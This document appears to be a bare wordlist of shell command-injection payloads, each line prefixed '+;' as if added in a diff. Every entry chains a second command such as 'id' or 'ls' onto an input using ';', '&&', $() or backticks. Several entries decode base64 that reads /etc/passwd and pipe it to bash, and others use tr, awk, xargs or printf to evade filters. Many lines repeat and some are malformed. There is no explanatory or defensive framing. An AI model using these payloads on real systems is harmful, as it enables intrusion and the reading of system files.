+; (id) \&\& echo "done" > /dev/null
+; (id) \&\& \echo done` > /dev/null`
+; (id); echo "done"
+; \$(echo test) \&\& id
+; \id` && echo "done"`
+; id \| xargs -I{} sh -c '{} && echo "done"'
+; id \&\& echo "done" \&\&
+; id; echo "done" \&\&
+; (id; echo "done")
+; echo 'id' \&\& bash -c 'id'
+; (id \&\& echo 'done' \&\& echo 'more')
+; $(echo 'id' \&\& echo 'done' \&\& ls)
+; $(echo 'id' \&\& echo 'done' \| tee /dev/null)
+; id \&\& echo 'done' \&\& echo 'more'
+; (echo 'id' \| xargs -I{} sh -c '{} \&\& echo done')
+; echo -e 'id\n$(ls)' \| bash
+; \echo $(id)` && echo 'done'`
+; \$(ls -la \&\& \$(id))
+; \$(echo \ls` && `id`)`
+; \$(echo \ls -la` && `id`)`
+; $(echo \id` && `ls -la`)`
+; $(echo \ls -la` && `id`)`
+; $(echo \$(ls -la) \&\& \$(id))
+; $(echo \ls` && `id`)`
+; \$(echo id \&\& echo 'done')
+; \$(echo \id` && echo 'done')`
+; (echo 'id' \&\& echo 'done' \| tee /dev/null)
+; echo 'id' \| tee /dev/null \&\& echo 'done'
+; $(echo 'id' \&\& \$(ls -la))
+; \echo $(id)` && echo done`
+; \echo id | base64 -d` && echo 'done'`
+; \$(echo 'id' \&\& \echo done`)`
+; \id && echo 'done'``
+; \ls && id && echo done
+; \$(echo cat \| base64 -w0 /etc/passwd | base64 -d | bash)
+; \echo $(cat /etc/passwd)``
+; \base64 -d <<< 'Y2F0IC9ldGMvcGFzc3dk' | bash``
+; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+; \$(echo c'at' \&\& echo 'done')
+; \$(echo echo 'hello' \&\& id)
+; \$(echo 'ls -la \&\& id')
+; \$(base64 -d <<< 'Y2F0IC9ldGMvcGFzc3dk' | bash)
+; \echo 'ls -la' && id``
+; (ls \&\& id)
+; \$(id \&\& echo done)
+; \ls && id``
+; \echo id && ls``
+; id \&\& echo done
+; \$(id \&\& echo done)
+; \$(id | base64 -d <<< 'aWQ=')
+; \echo id && ls``
+; echo "id" | bash
+; \$(echo id \&\& ls)
+; \ls && echo done``
+; \$(base64 -d <<< 'Y2F0IC9ldGMvcGFzc3dk' | bash)
+; (echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash)
+; $(id \&\& echo done)
+; $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash)
+; $(id \&\& echo "done")
+; echo "id" \&\& bash -c "id"
+; $(echo "id \&\& echo done" \&\& bash -c "id")
+; $(echo "id; echo 'done'" | bash)
+; (id \&\& echo 'done')
+; \echo 'id' && echo 'done'``
+; echo 'id \&\& ls' \&\& sh
+; echo "id" \&\& (bash -c "id")
+; echo -e "id\n$(ls)" \&\& sh
+; \$(id \&\& echo 'done')
+; echo 'id' | base64 -d | bash
+; echo 'id' \&\& $(sh -c 'echo done')
+; id \&\& echo 'done' \&\& echo 'more'
+; $(echo 'id \&\& echo "done"' \&\& bash)
+; \$(id \&\& \$(echo 'done'))
+; echo 'id \&\& ls' | sh
+; (echo 'id \&\& ls' \&\& bash)
+; $(echo 'id \&\& ls' \| bash)
+; \echo id && echo done``
+; \echo id && sh -c 'echo done'``
+; $(echo 'id \&\& ls -la' \| sh)
+; $(echo 'id \&\& echo done' \&\& sh)
+; echo 'id' | base64 -d | bash
+; $(echo 'ls \&\& id' \| bash)
+; \echo id && echo done && ls``
+; (echo 'id' \&\& ls)
+; (echo 'id' \&\& sh -c 'ls')
+; \$(echo 'id' \&\& bash -c 'ls')
+; (echo 'id' \&\& \$(ls))
+; \$(echo 'id \&\& echo done' | bash)
+; (echo id \&\& echo done \| bash)
+; (echo 'id' \&\& echo done \&\& ls)
+; \$(echo 'id' \&\& echo 'done' \&\& ls)
+; (echo 'id' \&\& ls -la)
+; (echo 'id \&\& echo done')
+; $(echo 'id' \&\& (sh -c 'echo done'))
+; $(echo 'id \&\& ls -la' | bash)
+; echo 'id \&\& ls' \| bash
+; echo 'id' \&\& echo 'done' \| base64 -d
+; (id \&\& echo 'done')
+; echo 'id \&\& (ls \&\& echo done)' \&\& sh
+; $(id \&\& echo 'done')
+; \$(echo 'id \&\& ls -la')
+; echo 'id' \&\& (bash -c 'echo done')
+; echo 'id' \| xargs sh -c 'id \&\& echo done'
+; \$(echo id \&\& ls \&\& echo done)
+; echo 'id \&\& echo done' \&\& bash
+; (id \&\& echo 'done' \&\& sh)
+; echo 'id' \&\& (sh -c 'echo done')
+; (echo 'id' \&\& ls \&\& echo done)
+; \$(echo 'id \&\& echo done' \&\& sh)
+; (ls \&\& id)
+; \$(echo 'id \&\& echo done')
+; (echo 'id \&\& sh -c "echo done"')
+; echo 'id' \&\& (sh -c 'echo done')
+; \$(echo 'id \&\& echo done')
+; echo 'id' \&\& bash -c 'echo done'
+; echo 'id' \&\& bash -c 'ls'
+; (echo 'id' \&\& sh -c 'echo done')
+; echo 'id' \&\& ls -la \&\& echo 'done'
+; \$(echo 'id \&\& echo done')
+; (id \&\& echo 'done' \&\& echo 'more')
+; $(echo 'id \&\& ls \&\& echo done')
+; \$(echo 'id \&\& echo done' \&\& bash)
+; echo 'id' \&\& (bash -c 'echo done')
+; $(echo 'id \&\& echo done')
+; \echo 'id' && echo 'done' && sh``
+; $(echo 'id' \&\& echo 'done' \&\& ls)
+; (echo 'id' \&\& sh -c 'ls \&\& echo done')
+; $(echo 'id' \&\& echo done \&\& ls)
+; echo 'id \&\& ls' | sh
+; $(echo 'id \&\& echo done')
+; \$(echo 'id \&\& ls' \&\& bash -c 'echo done')
+; echo 'id' \&\& echo 'done' \&\& (sh -c 'ls')
+; \$(echo 'id' \&\& (sh -c 'echo done'))
+; $(echo 'id' \&\& echo 'done')
+; \$(echo 'id \&\& echo done')
+; \$(echo 'id' \&\& ls)
+; echo 'id \&\& sh -c "ls"'
+; $(echo 'id \&\& ls' \&\& sh)
+; \$(echo 'id \&\& echo done')
+; (echo 'id' \&\& (sh -c 'echo done'))
+; echo 'id \&\& (sh -c "ls \&\& echo done")'
+; (echo 'id' \&\& ls -la)
+; echo 'id' \&\& sh -c 'echo done'
+; $(echo 'id \&\& ls' \&\& sh -c 'echo done')
+; (echo 'id \&\& sh -c "ls" \&\& echo done')
+; echo 'id' \&\& echo 'done' \&\& (sh -c 'ls')
+; \$(echo 'id' \&\& sh -c 'echo done')
+; (id \&\& echo 'done')
+; (echo 'id' \&\& sh -c 'echo done')
+; echo 'id \&\& (ls \&\& echo done)'
+; $(echo 'id \&\& ls \&\& echo done')
+; (echo 'id' \&\& bash -c 'echo done')
+; echo 'id' \&\& sh -c 'echo done'
+; \$(echo 'id \&\& echo done')
+; echo 'id' \&\& (echo done \&\& ls)
+; (id \&\& ls -la \&\& echo done)
+; $(echo 'id' \&\& (sh -c 'ls') \&\& echo done)
+; echo 'id \&\& (sh -c "ls") \&\& echo done'
+; $(echo i | xargs -I {} sh -c '{}d')
+; $(echo id | base64 -d | sh)
+; $(printf "id" | sh)
+; $(echo id | tr 'a-z' 'a-z' | sh)
+; \$(echo \echo id`)`
+; \$(echo "id" | xargs -I {} bash -c '{}')
+; $(echo id | sed 's/i/id/')
+; $(echo id | awk '{print $1}')
+; $(echo -e "id" | sh)
+; $(echo id | perl -e 'print')
+; $(echo 'id' | awk '{print $0}')
+; $(echo id | sed 's/i/id/')
+; $(echo id | awk '{print $0}')
+; $(echo "id" | tr '[:lower:]' '[:upper:]' | tr 'I' 'i' | sh)
+; $(echo id | perl -e 'print')
+; $(echo id | tr 'a-z' 'a-z' | sh)
+; $(echo i | xargs -I {} sh -c '{}d')
+; $(echo 'i' | awk '{print "id"}' | sh)
+; $(echo id | base64 -w 0 | base64 -d | sh)
+; $(echo id | awk '{print $1}')
+; $(printf 'id' | sh)
+; $(echo id | perl -e 'print')
+; $(echo id | awk '{print $0}' | sh)
+; $(echo id | xargs -I {} sh -c '{}')
+; $(echo id | sed 's/i/id/')
+; $(echo id | perl -e 'print')
+; $(echo id | awk '{print $0}' | sh)
+; $(echo id | tr 'a-z' 'a-z' | sh)
+; $(echo id | perl -e 'print')
+; $(echo id | tr '[:lower:]' '[:upper:]' | sed 's/I/i/')
+; $(echo "id" | base64 -d | sh)
+; $(echo id | xargs -I {} sh -c '{}')
+; $(echo id | awk '{print $1}' | sh)
+; $(echo "id" | base64 -d | sh)
+; $(echo id | xargs -I {} sh -c '{}')
+; $(echo id | awk '{print $0}' | sh)
+; $(echo id | tr 'a-z' 'a-z' | sh)
+; $(echo i | xargs -I {} sh -c '{}d')
+; $(echo id | sed 's/i/id/')
+; $(echo id | awk '{print $0}')
+; $(echo id | base64 -w 0 | base64 -d | sh)
+; $(echo "id" | base64 -d | sh)
+; $(echo id | xargs -I {} sh -c '{}')
+; $(echo id | perl -e 'print')
+; $(echo id | tr '[:lower:]' '[:upper:]' | tr 'I' 'i' | sh)
+; $(echo 'id' | awk '{print $0}')
+; $(echo 'id' | base64 -d | sh)
+; $(echo id | sed 's/i/id/')
+; $(echo id | awk '{print $0}')
+; $(echo id | base64 -w 0 | base64 -d | sh)
